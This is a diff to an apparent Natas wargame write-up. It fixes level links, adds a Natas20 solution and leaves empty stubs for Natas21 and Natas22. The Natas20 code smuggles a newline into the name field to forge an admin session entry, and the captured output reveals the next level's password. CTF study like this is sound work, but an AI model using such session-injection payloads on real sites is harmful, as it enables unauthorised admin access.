@@ -1001,7 +1001,7 @@ xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP
 ```
 
 ## Natas18
-https://overthewire.org/wargames/natas/natas17.html
+https://overthewire.org/wargames/natas/natas18.html
 
 > Natas Level 17 → Level 18
 
@@ -1046,7 +1046,7 @@ Password: 4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs</pre><div id="viewsource"><a href="in
 
 
 ## Natas19
-https://overthewire.org/wargames/natas/natas17.html
+https://overthewire.org/wargames/natas/natas19.html
 
 > Natas Level 18 → Level 19
 
@@ -1095,6 +1095,94 @@ DEBUG: Session start ok<br>You are an admin. The credentials for the next level 
 Password: eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF</pre></div>
 </body>
 </html>
+```
+
+## Natas20
+https://overthewire.org/wargames/natas/natas21.html
+
+> Natas Level 19 → Level 20
+
+> Username: natas20
+
+> URL:      http://natas20.natas.labs.overthewire.org
+
+```python
+import natasX
+
+natas = natasX
+
+print(natas.natasX(20, "eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF",
+                   endpoint="index.php",
+                   data={"debug": "", "name": "admin\nadmin 1"},
+                   cookies={"PHPSESSID": "q8k4kl3ar05rkga90rtib0ros1"}).text)
+
+```
+
+**Output**
+
+```html
+<html>
+<head>
+<!-- This stuff in the header has nothing to do with the level -->
+<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
+<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
+<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
+<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
+<script>var wechallinfo = { "level": "natas20", "pass": "eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF" };</script></head>
+<body>
+<h1>natas20</h1>
+<div id="content">
+DEBUG: MYREAD q8k4kl3ar05rkga90rtib0ros1<br>DEBUG: Reading from /var/lib/php5/sessions//mysess_q8k4kl3ar05rkga90rtib0ros1<br>DEBUG: Read [admin 1]<br>DEBUG: Read [name admin]<br>DEBUG: Read [admin 1]<br>DEBUG: Read []<br>DEBUG: Name set to admin
+admin 1<br>You are an admin. The credentials for the next level are:<br><pre>Username: natas21
+Password: IFekPyrQXftziDEsUr3x21sYuahypdgJ</pre>
+<form action="index.php" method="POST">
+Your name: <input name="name" value="admin
+admin 1"><br>
+<input type="submit" value="Change name" />
+</form>
+<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+</body>
+</html>
+DEBUG: MYWRITE q8k4kl3ar05rkga90rtib0ros1 admin|s:1:"1";name|s:13:"admin
+admin 1";<br>DEBUG: Saving in /var/lib/php5/sessions//mysess_q8k4kl3ar05rkga90rtib0ros1<br>DEBUG: admin => 1<br>DEBUG: name => admin
+admin 1<br>
+```
+
+## Natas21
+https://overthewire.org/wargames/natas/natas21.html
+
+> Natas Level 20 → Level 21
+
+> Username: natas21
+
+> URL:      http://natas21.natas.labs.overthewire.org
+
+```python
+```
+
+**Output**
+
+```html
+```
+
+## Natas22
+https://overthewire.org/wargames/natas/natas21.html
+
+> Natas Level 21 → Level 22
+
+> Username: natas22
+
+> URL:      http://natas22.natas.labs.overthewire.org
+
+```python
+```
+
+**Output**
+
+```html
 ```
 
 <br>
